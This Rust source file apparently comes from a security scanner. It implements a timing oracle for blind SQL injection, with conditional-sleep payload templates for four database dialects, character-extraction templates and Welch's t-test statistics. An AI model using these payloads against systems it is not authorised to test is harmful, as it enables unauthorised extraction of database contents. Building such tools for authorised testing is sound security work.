use serde::{Deserialize, Serialize};
use std::fmt;

/// Configuration for the statistical timing oracle.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TimingOracleConfig {
    pub min_samples: u32,
    pub max_samples: u32,
    pub significance_level: f64,
    pub precision_ns: bool,
}

impl TimingOracleConfig {
    pub fn new() -> Self {
        Self {
            min_samples: 30,
            max_samples: 200,
            significance_level: 0.05,
            precision_ns: false,
        }
    }

    pub fn with_min_samples(mut self, n: u32) -> Self {
        self.min_samples = n;
        self
    }

    pub fn with_max_samples(mut self, n: u32) -> Self {
        self.max_samples = n;
        self
    }

    pub fn with_significance_level(mut self, alpha: f64) -> Self {
        self.significance_level = alpha;
        self
    }

    pub fn with_precision_ns(mut self, ns: bool) -> Self {
        self.precision_ns = ns;
        self
    }
}

impl Default for TimingOracleConfig {
    fn default() -> Self {
        Self::new()
    }
}

/// Database dialect for SQL timing injection templates.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum DbType {
    MySQL,
    PostgreSQL,
    MSSQL,
    SQLite,
}

impl fmt::Display for DbType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::MySQL => "mysql",
            Self::PostgreSQL => "postgresql",
            Self::MSSQL => "mssql",
            Self::SQLite => "sqlite",
        };
        write!(f, "{label}")
    }
}

/// Returns a SQL timing template for the given database dialect.
///
/// Templates use a conditional sleep: if the condition is true, the response
/// is delayed by the specified seconds. The `condition` placeholder should be
/// replaced with the actual boolean expression.
pub fn sql_timing_template(db: DbType, sleep_seconds: f64) -> String {
    match db {
        DbType::MySQL => format!("IF({{condition}},SLEEP({sleep_seconds}),0)"),
        DbType::PostgreSQL => format!("CASE WHEN {{condition}} THEN pg_sleep({sleep_seconds}) END"),
        DbType::MSSQL => {
            let ms = (sleep_seconds * 1000.0) as u64;
            let s = ms / 1000;
            let rem = ms % 1000;
            format!("IF {{condition}} WAITFOR DELAY '0:0:{s}.{rem:03}'")
        }
        DbType::SQLite => format!(
            "CASE WHEN {{condition}} THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({})))) END",
            (sleep_seconds * 100_000.0) as u64
        ),
    }
}

/// Returns a blind SQL injection character extraction template.
///
/// The template extracts the character at `position` from `query_expression`
/// and compares it with a placeholder `{{char}}`.
pub fn blind_char_template(db: DbType, query_expression: &str, position: usize) -> String {
    match db {
        DbType::MySQL => format!(
            "SUBSTRING(({query_expression}),{pos},1)='{{{{char}}}}'",
            pos = position + 1,
        ),
        DbType::PostgreSQL => format!(
            "SUBSTR(({query_expression}),{pos},1)='{{{{char}}}}'",
            pos = position + 1,
        ),
        DbType::MSSQL => format!(
            "SUBSTRING(({query_expression}),{pos},1)='{{{{char}}}}'",
            pos = position + 1,
        ),
        DbType::SQLite => format!(
            "SUBSTR(({query_expression}),{pos},1)='{{{{char}}}}'",
            pos = position + 1,
        ),
    }
}

/// Result of a Welch's t-test comparing two independent samples.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TTestResult {
    pub t_statistic: f64,
    pub degrees_of_freedom: f64,
    pub p_value: f64,
    pub significant: bool,
    pub mean_diff_ns: f64,
}

/// Result of adaptive sampling that continues until statistical significance or sample cap.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdaptiveSampleResult {
    pub samples_taken: u32,
    pub converged: bool,
    pub result: TTestResult,
}

/// Result of testing one condition against a baseline.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ConditionResult {
    pub condition: String,
    pub mean_ns: f64,
    pub std_dev_ns: f64,
    pub vs_baseline: Option<TTestResult>,
}

/// Result of blind character extraction via timing side-channel.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BlindExtraction {
    pub extracted: String,
    pub confidence: f64,
    pub chars_per_second: f64,
}

/// A single timing measurement for a request.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TimingMeasurement {
    pub timestamp_ns: u128,
    pub duration_ns: u64,
    pub payload: String,
}

/// Statistical timing oracle with Welch's t-test, adaptive sampling,
/// and blind character extraction via timing side-channels.
pub struct TimingOracleV2 {
    config: TimingOracleConfig,
}

impl TimingOracleV2 {
    pub fn new(config: TimingOracleConfig) -> Self {
        Self { config }
    }

    pub fn config(&self) -> &TimingOracleConfig {
        &self.config
    }

    /// Perform Welch's t-test on two independent samples.
    ///
    /// Uses the Welch-Satterthwaite approximation for degrees of freedom
    /// and a t-distribution CDF approximation for the p-value.
    pub fn welch_t_test(&self, sample_a: &[f64], sample_b: &[f64]) -> TTestResult {
        welch_t_test_impl(sample_a, sample_b, self.config.significance_level)
    }

    /// Adaptively collect samples until statistical significance is reached
    /// or `max_samples` is exceeded.
    ///
    /// Takes existing sample sets and returns the result along with whether
    /// the test converged (became significant before hitting the cap).
    pub fn adaptive_sample(&self, sample_a: &[f64], sample_b: &[f64]) -> AdaptiveSampleResult {
        let result = welch_t_test_impl(sample_a, sample_b, self.config.significance_level);
        let samples_taken = (sample_a.len() + sample_b.len()) as u32;
        let converged = result.significant;

        AdaptiveSampleResult {
            samples_taken,
            converged,
            result,
        }
    }

    /// Test multiple conditions against a baseline (first entry).
    ///
    /// Returns one `ConditionResult` per sample set. The first is the baseline
    /// (no t-test against itself), subsequent entries are compared against it.
    pub fn multi_condition_test(&self, labeled_samples: &[(&str, &[f64])]) -> Vec<ConditionResult> {
        if labeled_samples.is_empty() {
            return Vec::new();
        }

        let (baseline_label, baseline_samples) = labeled_samples[0];
        let baseline_mean = mean(baseline_samples);
        let baseline_std = std_dev(baseline_samples);

        let mut results = vec![ConditionResult {
            condition: baseline_label.to_string(),
            mean_ns: baseline_mean,
            std_dev_ns: baseline_std,
            vs_baseline: None,
        }];

        for &(label, samples) in &labeled_samples[1..] {
            let t_result =
                welch_t_test_impl(baseline_samples, samples, self.config.significance_level);
            results.push(ConditionResult {
                condition: label.to_string(),
                mean_ns: mean(samples),
                std_dev_ns: std_dev(samples),
                vs_baseline: Some(t_result),
            });
        }

        results
    }

    /// Extract a single character at `position` using timing differences.
    ///
    /// For each character in `charset`, compares timing samples against a
    /// baseline. The character with the largest statistically significant
    /// mean difference is returned.
    pub fn blind_extract_char(
        &self,
        char_timings: &[(&char, &[f64])],
        baseline: &[f64],
    ) -> Option<char> {
        let mut best_char: Option<char> = None;
        let mut best_diff: f64 = 0.0;

        for &(ch, samples) in char_timings {
            let result = welch_t_test_impl(baseline, samples, self.config.significance_level);
            if result.significant && result.mean_diff_ns.abs() > best_diff {
                best_diff = result.mean_diff_ns.abs();
                best_char = Some(*ch);
            }
        }

        best_char
    }

    /// Extract a full string using blind timing-based character-by-character extraction.
    ///
    /// Takes pre-collected timing data per position per character and returns
    /// the extracted string with confidence metrics.
    pub fn blind_sqli_extract(
        &self,
        position_timings: &[Vec<(&char, &[f64])>],
        baselines: &[&[f64]],
    ) -> BlindExtraction {
        let mut extracted = String::new();
        let mut total_confidence = 0.0;
        let positions = position_timings.len().min(baselines.len());

        for i in 0..positions {
            if let Some(ch) = self.blind_extract_char(&position_timings[i], baselines[i]) {
                extracted.push(ch);
                total_confidence += 1.0;
            } else {
                break;
            }
        }

        let confidence = if extracted.is_empty() {
            0.0
        } else {
            total_confidence / positions as f64
        };

        BlindExtraction {
            extracted,
            confidence,
            chars_per_second: 0.0,
        }
    }
}

/// Compute Welch's t-test between two independent samples.
///
/// Returns the t-statistic, Welch-Satterthwaite degrees of freedom,
/// approximate p-value, and whether the difference is significant.
pub fn welch_t_test_impl(sample_a: &[f64], sample_b: &[f64], alpha: f64) -> TTestResult {
    let n_a = sample_a.len() as f64;
    let n_b = sample_b.len() as f64;

    if n_a < 2.0 || n_b < 2.0 {
        return TTestResult {
            t_statistic: 0.0,
            degrees_of_freedom: 0.0,
            p_value: 1.0,
            significant: false,
            mean_diff_ns: 0.0,
        };
    }

    let mean_a = mean(sample_a);
    let mean_b = mean(sample_b);
    let var_a = variance(sample_a);
    let var_b = variance(sample_b);

    let se_a = var_a / n_a;
    let se_b = var_b / n_b;
    let se_sum = se_a + se_b;

    if se_sum <= 0.0 {
        return TTestResult {
            t_statistic: 0.0,
            degrees_of_freedom: n_a + n_b - 2.0,
            p_value: 1.0,
            significant: false,
            mean_diff_ns: mean_a - mean_b,
        };
    }

    let t_stat = (mean_a - mean_b) / se_sum.sqrt();

    // Welch-Satterthwaite degrees of freedom
    let df_num = se_sum * se_sum;
    let df_denom = (se_a * se_a) / (n_a - 1.0) + (se_b * se_b) / (n_b - 1.0);
    let df = if df_denom > 0.0 {
        df_num / df_denom
    } else {
        n_a + n_b - 2.0
    };

    let p_value = two_tailed_t_cdf(t_stat.abs(), df);

    TTestResult {
        t_statistic: t_stat,
        degrees_of_freedom: df,
        p_value,
        significant: p_value < alpha,
        mean_diff_ns: mean_a - mean_b,
    }
}

/// Approximate the two-tailed p-value from the t-distribution.
///
/// Uses the regularized incomplete beta function approximation.
/// For df >= 30, falls back to the normal distribution approximation.
fn two_tailed_t_cdf(t_abs: f64, df: f64) -> f64 {
    if df <= 0.0 {
        return 1.0;
    }

    // For large df, use normal approximation
    if df >= 100.0 {
        return 2.0 * normal_sf(t_abs);
    }

    // Beta regularized incomplete function: I_x(a, b) where x = df/(df+t^2)
    let x = df / (df + t_abs * t_abs);
    let a = df / 2.0;
    let b = 0.5;

    let i_x = regularized_incomplete_beta(x, a, b);
    i_x.clamp(0.0, 1.0)
}

/// Standard normal survival function: P(Z > z) using error function approximation.
fn normal_sf(z: f64) -> f64 {
    0.5 * erfc(z / std::f64::consts::SQRT_2)
}

/// Complementary error function approximation (Abramowitz and Stegun 7.1.26).
fn erfc(x: f64) -> f64 {
    if x < 0.0 {
        return 2.0 - erfc(-x);
    }

    let t = 1.0 / (1.0 + 0.3275911 * x);
    let poly = t
        * (0.254829592
            + t * (-0.284496736 + t * (1.421413741 + t * (-1.453152027 + t * 1.061405429))));
    poly * (-x * x).exp()
}

/// Regularized incomplete beta function I_x(a, b) via continued fraction
/// (Lentz's method). Accurate to ~1e-10 for most inputs.
fn regularized_incomplete_beta(x: f64, a: f64, b: f64) -> f64 {
    if x <= 0.0 {
        return 0.0;
    }
    if x >= 1.0 {
        return 1.0;
    }

    // Use the symmetry relation when x > (a+1)/(a+b+2) for better convergence
    if x > (a + 1.0) / (a + b + 2.0) {
        return 1.0 - regularized_incomplete_beta(1.0 - x, b, a);
    }

    let ln_prefix = a * x.ln() + b * (1.0 - x).ln() - ln_beta(a, b) - a.ln();
    let prefix = ln_prefix.exp();

    // Lentz's continued fraction
    let mut c = 1.0;
    let mut d = 1.0 - (a + b) * x / (a + 1.0);
    if d.abs() < 1e-30 {
        d = 1e-30;
    }
    d = 1.0 / d;
    let mut f = d;

    for m in 1..=200 {
        let m_f64 = m as f64;

        // Even step: d_{2m} = m*(b-m)*x / ((a+2m-1)*(a+2m))
        let num_even = m_f64 * (b - m_f64) * x / ((a + 2.0 * m_f64 - 1.0) * (a + 2.0 * m_f64));
        d = 1.0 + num_even * d;
        if d.abs() < 1e-30 {
            d = 1e-30;
        }
        d = 1.0 / d;
        c = 1.0 + num_even / c;
        if c.abs() < 1e-30 {
            c = 1e-30;
        }
        f *= c * d;

        // Odd step: d_{2m+1} = -(a+m)*(a+b+m)*x / ((a+2m)*(a+2m+1))
        let num_odd =
            -(a + m_f64) * (a + b + m_f64) * x / ((a + 2.0 * m_f64) * (a + 2.0 * m_f64 + 1.0));
        d = 1.0 + num_odd * d;
        if d.abs() < 1e-30 {
            d = 1e-30;
        }
        d = 1.0 / d;
        c = 1.0 + num_odd / c;
        if c.abs() < 1e-30 {
            c = 1e-30;
        }
        let delta = c * d;
        f *= delta;

        if (delta - 1.0).abs() < 1e-10 {
            break;
        }
    }

    prefix * f
}

/// Natural log of the Beta function via lgamma.
fn ln_beta(a: f64, b: f64) -> f64 {
    ln_gamma(a) + ln_gamma(b) - ln_gamma(a + b)
}

/// Stirling's approximation for ln(Gamma(x)) with Lanczos correction.
fn ln_gamma(x: f64) -> f64 {
    if x <= 0.0 {
        return f64::INFINITY;
    }

    // Lanczos approximation (g=7, n=9)
    let coefficients = [
        0.999_999_999_999_809_9,
        676.520_368_121_885_1,
        -1_259.139_216_722_402_8,
        771.323_428_777_653_1,
        -176.615_029_162_140_6,
        12.507_343_278_686_905,
        -0.138_571_095_265_720_12,
        9.984_369_578_019_572e-6,
        1.505_632_735_149_311_6e-7,
    ];

    if x < 0.5 {
        let pi = std::f64::consts::PI;
        return pi.ln() - (pi * x).sin().ln() - ln_gamma(1.0 - x);
    }

    let x = x - 1.0;
    let mut sum = coefficients[0];
    for (i, &coeff) in coefficients.iter().enumerate().skip(1) {
        sum += coeff / (x + i as f64);
    }

    let t = x + 7.5;
    0.5 * (2.0 * std::f64::consts::PI).ln() + (t.ln() * (x + 0.5)) - t + sum.ln()
}

fn mean(values: &[f64]) -> f64 {
    if values.is_empty() {
        return 0.0;
    }
    values.iter().sum::<f64>() / values.len() as f64
}

fn variance(values: &[f64]) -> f64 {
    if values.len() < 2 {
        return 0.0;
    }
    let m = mean(values);
    values.iter().map(|v| (v - m).powi(2)).sum::<f64>() / (values.len() - 1) as f64
}

fn std_dev(values: &[f64]) -> f64 {
    variance(values).sqrt()
}
